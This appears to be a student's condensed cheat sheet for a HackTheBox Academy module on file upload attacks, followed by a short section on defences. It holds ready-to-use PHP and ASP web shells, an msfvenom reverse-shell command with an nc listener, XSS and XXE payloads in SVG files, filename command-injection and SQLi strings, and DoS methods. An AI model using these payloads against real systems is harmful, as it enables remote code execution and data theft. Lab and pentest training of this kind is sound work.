# FILE UPLOAD ATTACKS

## INTRO TO FILE UPLOAD ATTACKS

Root cause: weak or missing file validation. Worst case — unauthenticated arbitrary file upload — one step from full RCE. Most CVEs in this class score High/Critical (CWE-434: https://www.cvedetails.com/vulnerability-list/cweid-434/vulnerabilities.html).

Full RCE path: upload a web shell or reverse shell script, hit it. Even without arbitrary upload, restricted file types still open doors — XSS/XXE via crafted files, DoS, overwriting system files/configs. Root cause isn't always bad code either — outdated libraries get you there too.

## ABSENT VALIDATION

No filter at all. Confirm via the file picker dialog — "All Files" with no type restriction is the tell.

Identify the backend language before writing anything — shell has to match it (PHP shell won't run on a Java backend). Quick check: hit `/index.<ext>` for common extensions (php, asp, aspx...) — resolves to the same page = that's your language. Faster: Burp Intruder + a web-extensions wordlist (https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt). Or skip all that — install Wappalyzer (https://www.wappalyzer.com), one click gives language, server, OS, full stack.

Confirm actual code execution before going further, not just storage:

```php
<?php echo "Hello HTB";?>
```

Upload it, hit the file. String prints = code executed = real RCE path confirmed. Source printed instead = no PHP execution, dead end.

## UPLOAD EXPLOITATION

Ready-made shells: phpbash (https://github.com/Arrexel/phpbash) — terminal-like, semi-interactive. SecLists Web-Shells (https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) — `/opt/useful/seclists/Web-Shells` on Pwnbox, covers every language.

One-liner PHP shell worth memorizing:

```php
<?php system($_REQUEST['cmd']); ?>
```

```
http://<TARGET_IP>:<PORT>/uploads/shell.php?cmd=id
```

View with `CTRL+U` (raw source) — skips HTML rendering mangling the output formatting.

.NET equivalent:

```asp
<% eval request('cmd') %>
```

Shell not firing → server-side function disabled (`system()` etc.) or a WAF's in the way. Bypass approach is the same idea as command injection filter bypass, out of scope here.

Reverse shell beats a web shell when it works — full interactivity. pentestmonkey's PHP shell (https://github.com/pentestmonkey/php-reverse-shell), or grab one from the same SecLists repo. Edit IP/port (lines 49/50 in pentestmonkey), listener up first:

```bash
nc -lvnp <OUR_PORT>
```

upload, hit the link, catch shell.

msfvenom for a custom reverse shell — more reliable than a raw `system()` reverse shell one-liner:

```bash
msfvenom -p php/reverse_php LHOST=<OUR_IP> LPORT=<OUR_PORT> -f raw > reverse.php
```

Same flow after — listener, upload, visit. If a reverse shell dies (egress firewall, disabled network functions), fall back to the web shell.

## CLIENT-SIDE VALIDATION

JS-only validation is functionally no validation. Two ways past it.

**Backend request modification** — capture a normal valid upload in Burp, note `filename="<X>.png"` and the raw file content block. Swap both for your shell's, forward. If the backend isn't independently re-checking, it goes straight through. File part's `Content-Type` doesn't matter yet at this stage, leave it.

**Killing the JS directly** — Inspector (`CTRL+SHIFT+C`) on the upload input. `accept="..."` is cosmetic, just filters the file picker UI — the real gate is usually an `onchange` handler. Console (`CTRL+SHIFT+K`), type the handler's name, dump its source, confirm it's blocking on extension. Delete the `onchange` attribute (or the function itself) straight from the Inspector — gone for that page load, doesn't survive a refresh, doesn't need to. Upload normally after.

## BLACKLIST FILTERS

```php
$blacklist = array('php', 'php7', 'phps');
if (in_array($extension, $blacklist)) { /* deny */ }
```

Weak by construction — can't ever be exhaustive. Case-sensitive comparisons on a Windows backend are a free bypass too (`pHp` vs `php`).

Fuzz for what's missing from the list: Burp Intruder, position on the extension only, PHP extension wordlist from PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst — same repo has a .NET list too, `.../Extension%20ASP`). Untick URL-encoding so the `.` stays literal. Sort by response length — anything not matching the "not allowed" length got through.

Not every allowed extension actually executes PHP — server-dependent, try a few. `.phtml` is the reliable first guess:

```
http://<TARGET_IP>:<PORT>/profile_images/shell.phtml?cmd=id
```

## WHITELIST FILTERS

Stronger by default — deny-all except named types, doesn't need exhaustive coverage. Common implementation bug: checking the extension exists _somewhere_ in the name instead of anchoring to the end.

```php
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) { /* deny */ }
```

No `$` anchor → `shell.jpg.php` passes (it does contain `.jpg`) and still executes as PHP.

Properly anchored, that bypass dies:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { /* deny */ }
```

Against this you need a server misconfig, not an app bug — Apache's own handler regex missing the same `$` anchor:

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

Any filename containing `.php` anywhere gets PHP execution rights regardless of what it ends with — so `shell.php.jpg` clears the app's strict whitelist _and_ executes, because the web server is the one matching loosely, not the app.

Character injection — stuff a separator around the extension boundary to desync how the app parses the name from how the OS/server writes it: `%20` `%0a` `%00` `%0d0a` `/` `.\` `.` `…` `:`. Each targets a specific stack — `shell.php%00.jpg` truncates on PHP ≤5.x (writes as `shell.php`), `shell.aspx:.jpg` abuses NTFS alternate data streams on Windows (writes as `shell.aspx`). Generate every permutation and fuzz the lot:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

## TYPE FILTERS

Extension can be completely clean and still get blocked — content itself gets inspected. Two mechanisms, same underlying weakness both times: the check trusts something it shouldn't.

**Content-Type header** — set by the browser client-side off the file picker, derived from extension. Client-set means it's yours to change:

```php
$type = $_FILES['uploadFile']['type'];
if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) { /* deny */ }
```

Fuzz allowed values with SecLists content-types (https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt), filtered to `image/` if the error already tells you images are expected. Intercept the upload, set the file part's `Content-Type` to an allowed value, forward. Note there are two `Content-Type` headers on a multipart upload — outer request and inner file part — edit the inner one unless the request only carries one.

**MIME-type / magic bytes** — server reads the actual file signature (leading bytes), ignores name and header entirely. Same mechanism as the `file` command:

```bash
echo "this is a text file" > text.jpg
file text.jpg          # ASCII text
echo "GIF8" > text.jpg
file text.jpg           # GIF image data
```

GIF's the easy one to fake — printable ASCII signature, and `GIF8` alone (shared prefix of `GIF87a`/`GIF89a`) is usually enough to pass:

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);
if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) { /* deny */ }
```

Prepend `GIF8` before your shell's opening tag — passes the magic-byte check, still executes if extension/server config allow it. Output will literally start with `GIF8` since it's the first line the script prints.

Stack both against harder filters — allowed MIME + disallowed Content-Type, allowed MIME/Content-Type + disallowed extension, disallowed MIME/Content-Type + allowed extension. See what the app actually validates versus what it just checks on the surface.

## LIMITED FILE UPLOADS

No arbitrary upload doesn't mean no attack surface. Fuzz allowed extensions regardless, then see what the allowed types themselves open up.

**XSS** — HTML upload, even with zero code exec, is a stored XSS/CSRF vector on its own via a `<script>` tag. Image metadata fields that get displayed back (EXIF `Comment`, `Artist`) are injectable:

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

SVG is XML — drop a `<script>` straight into the file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

Fires on render. Deeper coverage: HTB's XSS module (https://academy.hackthebox.com/app/module/103).

**XXE** — same SVG/XML angle, different payload, reads local files instead:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Bigger win than server enum — source disclosure. PHP filter wrapper avoids binary/special-char breakage:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Decode the base64, read the source, find the upload directory / naming scheme / allowed extensions directly instead of guessing. Same XML angle applies to PDF/Word/PowerPoint uploads too if the parsing library's vulnerable — blind XXE either way. Full mechanics: HTB's Web Attacks module (https://academy.hackthebox.com/app/module/134). Chains into SSRF as well — internal service enum, internal API calls (HTB's Server-side Attacks module: https://academy.hackthebox.com/app/module/145).

**DoS** — decompression bomb for archive uploads that get auto-extracted (nested ZIPs). Pixel flood: take a normal JPG/PNG, hand-edit the compression header to claim a massive resolution (`0xffff x 0xffff` ≈ 4 gigapixels) while the file itself stays small — server tries to allocate memory for the claimed size on decode, crashes. Cheaper options: no file-size cap → fill the disk with one giant upload; directory traversal in the upload path (`../../../etc/passwd`) → write outside the intended directory.

## OTHER UPLOAD ATTACKS

**Filename injection** — the name itself gets used unsanitized downstream. Command injection if it hits an OS command (`mv <file> /tmp`): `file$(whoami).jpg`, ``file`whoami`.jpg``, `file.jpg||whoami` (full technique breakdown: HTB's Command Injections module, https://academy.hackthebox.com/app/module/109). XSS if the filename gets displayed: `<script>alert(window.origin);</script>`. SQLi if it hits a query: `file';select+sleep(5);--.jpg`.

**Upload dir disclosure** — no direct link to your file? Fuzz for the directory, or pull it straight from source via LFI/XXE (same Web Attacks module above covers the IDOR-adjacent techniques for locating storage/naming schemes). Forcing an error is the cheap route: duplicate an existing filename, fire two identical uploads simultaneously (write collision), or send a filename thousands of characters long — any of these can trip an unhandled error that leaks the storage path.

**Windows-specific** — reserved characters (`| < > * ?`) in an unsanitized/unquoted filename can misresolve to a different file and error out, leaking the directory. Reserved device names (`CON`, `COM1`, `LPT1`, `NUL`) as a filename → write fails, same leak. 8.3 short filenames (https://en.wikipedia.org/wiki/8.3_filename) — `HAC~1.TXT` resolves to the first matching file starting `HAC` — can reference or overwrite a file you can't otherwise name directly (`WEB~1.CON` → `web.conf`).

**Advanced** — anything that auto-processes the upload afterward (transcoding, compression, renaming) is its own attack surface if the library doing it is vulnerable — e.g. `ffmpeg` AVI parsing → XXE. Custom in-house libraries need real vuln research here, not a checklist — worth reading bug bounty writeups for the pattern.

## PREVENTING FILE UPLOAD VULNERABILITIES

**Extension** — whitelist AND blacklist together, not either alone; the blacklist catches whitelist-bypass attempts (`shell.php.jpg`) as a second layer:

```php
// blacklist — matches anywhere in the name
if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) { die("Only images are allowed"); }
// whitelist — anchored to the end
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { die("Only images are allowed"); }
```

Front-end validation too, even bypassable — cuts accidental wrong-file uploads and false alerts on the defense side.

**Content** — extension check is never a substitute for content check, run both, make sure they agree:

```php
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
// whitelist
if (!preg_match('/^.*\.png$/', $fileName)) { die("Only PNG images are allowed"); }
// content
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) { die("Only PNG images are allowed"); }
}
```

**Disclosure** — never expose the uploads directory or a direct file link. Serve through a gated `download.php`: enforce ownership/auth checks (IDOR), strict allowlist on the resolvable path (LFI). Direct hits to the uploads dir → `403`. Serve with `Content-Disposition: attachment` (forces download, no inline render), correct `Content-Type`, `X-Content-Type-Options: nosniff` (kills MIME-sniffing). Randomize stored filenames, keep the real name in a DB, resolve only at download time — kills filename-injection risk as a bonus. Host uploads on a separate server/container so RCE there ≠ RCE on the main app. `open_basedir` (PHP) to cage the app to its own directory tree.

**Further hardening** — `disable_functions` in `php.ini` for `exec`, `shell_exec`, `system`, `passthru`. Suppress raw system/server errors — generic messages only, nothing that leaks filenames, paths, or stack details. Cap file size. Keep upload-handling libraries patched. Scan uploads for malware/malicious strings. WAF as a second layer, never the only one.